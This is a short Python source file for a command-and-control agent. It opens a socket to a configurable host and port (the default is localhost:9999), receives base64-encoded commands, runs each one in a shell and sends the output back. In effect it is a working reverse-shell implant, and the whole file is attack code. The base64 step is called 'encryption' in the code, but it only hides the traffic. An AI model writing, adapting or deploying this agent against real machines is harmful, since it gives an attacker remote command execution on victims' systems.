import base64
import socket
import subprocess
import sys

DEFAULT_HOST = "127.0.0.1"
DEFAULT_PORT = 9999

@staticmethod
def encrypt(data):
    return base64.b64encode(data)


@staticmethod
def decrypt(data):
    return base64.b64decode(data)


def agent(host, port):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client.connect((host, port))
        while True:

            # Receive the command and decrypt it
            command_enc = client.recv(1024)
            command = decrypt(command_enc).decode().strip()

            if command.lower() == "exit":
                break

            # Execute the command and send the output
            output = subprocess.getoutput(command)
            enc_output = encrypt(output.encode('utf-8') + b"\n")
            client.sendall(enc_output)
    except ConnectionRefusedError:
        print("Connection refused. Make sure the C2 server is running.")
    except Exception as e:
        print("An error occurred:", e)
    finally:
        client.close()

def main():
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = int(sys.argv[2])
    else:
        host = DEFAULT_HOST
        port = DEFAULT_PORT

    agent(host, port)

if __name__ == "__main__":
    main()
